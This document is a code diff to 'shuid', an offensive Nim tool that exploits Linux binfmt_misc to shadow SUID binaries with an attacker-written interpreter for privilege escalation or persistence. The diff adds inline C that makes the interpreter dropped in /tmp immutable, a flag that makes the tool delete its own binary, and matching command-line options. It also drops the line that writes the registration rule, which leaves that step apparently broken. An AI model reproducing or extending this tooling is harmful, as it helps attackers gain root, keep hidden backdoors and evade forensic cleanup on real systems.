@@ -20,6 +20,33 @@ const EXEC_PERM = 0o100
 const INTERPRETER_PATH: string = "/tmp/.6wwMkxWeWd"
 const INTERPRETER_CONTENT : string = slurp"../bin/interpreter" #staticRead 
 
+{.emit: """
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <linux/fs.h>
+
+
+int make_file_immutable(const char *filename){
+    FILE *fp;
+    if ((fp = fopen(filename, "w+")) == NULL) {
+            perror("fopen(3) error");
+            return EXIT_FAILURE;
+        }
+
+        int val = FS_IMMUTABLE_FL;
+        if (ioctl(fileno(fp), FS_IOC_SETFLAGS, &val) < 0)
+            perror("ioctl(2) error");
+
+        fclose(fp);
+    
+    return 0;
+}
+""".}
+proc MakeFileImmutable(filename:cstring): cint
+    {.importc: "make_file_immutable", nodecl.}
+
 proc checkBinfmt(privesc:bool):bool=
   ## Different checks to verify that the binfmt config allow the exploit
   ## - check if BINFMT module is loaded in kernel(config file)
@@ -102,7 +129,7 @@ proc searchSuid(dir, file: string,chooseSuid: bool): string=
   elif suids.len > 0 : return suids[^1]
   return ""
 
-proc exploit(registerPath, suidPath, interpreter: string): void=
+proc exploit(registerPath, suidPath, interpreter: string, immutableMode:bool): void=
   ## Exploit BIN_FMT feature to register a new type of executable
   ## - check that suid is an ELF binary
   ## - create interpreter
@@ -123,6 +150,8 @@ proc exploit(registerPath, suidPath, interpreter: string): void=
   writeFile(INTERPRETER_PATH, interpreter)
   setFilePermissions(INTERPRETER_PATH, {fpUserWrite, fpUserRead, fpUserExec,fpOthersExec,fpOthersRead,fpOthersWrite})
   styledEcho("✍️ Write interpreter in: ",fgCyan,INTERPRETER_PATH)
+  if immutableMode:
+    discard MakeFileImmutable(INTERPRETER_PATH)
   # register interpreter
   stream.setPosition(0)
   var headerSuidHex,registerLine: string
@@ -136,8 +165,6 @@ proc exploit(registerPath, suidPath, interpreter: string): void=
     styledEcho(fgblue,"~> Try running shuid with sudo")
     removeFile(INTERPRETER_PATH)
     quit(QuitFailure)
-
-  writeFile(registerPath, registerLine)
   styledEcho("🗒️ Register interpreter in: ",fgCyan, BINFMT_DIR & RULE_NAME)
 
   
@@ -155,7 +182,9 @@ proc shuid(
   file = "", 
   searchDir="/bin", 
   chooseSuid = false,
-  noExec=false
+  noExec=false,
+  immutable=false,
+  selfRemove=false
   ): void =
   ## shuid is define command line arguments to perform shadow suid file
   #[
@@ -163,6 +192,8 @@ proc shuid(
       - Get interpreter binary content from HTTP (not statically linked)
       - Specify interpreter name and location
   ]#
+  if selfRemove:
+    removeFile(getAppFilename())
   if check:
     if checkBinfmt(privesc):
       styledEcho("✔️ binfmt kernel feature is",fgGreen," enabled")
@@ -175,7 +206,7 @@ proc shuid(
     styledEcho("❌ No SUID file in ",fgRed,searchDir)
     quit(QuitFailure)
 
-  exploit(REGISTER_PATH,suid,INTERPRETER_CONTENT)
+  exploit(REGISTER_PATH,suid,INTERPRETER_CONTENT,immutable)
 
 when isMainModule:
   import cligen;  dispatch shuid, help={"privesc": "run in unprivileged mode to obtain privesc",
@@ -183,5 +214,7 @@ when isMainModule:
   "file": "SUID file to use",
   "searchDir": "directory use to find SUID file",
   "chooseSuid": "choose SUID file to use from the list (if not taken randomly)",
-  "noExec": "do not exec SUID file"
+  "noExec": "do not exec SUID file",
+  "immutable": "make the interpreter immutable",
+  "self-remove": "make shuid binary deletes itself"
   }
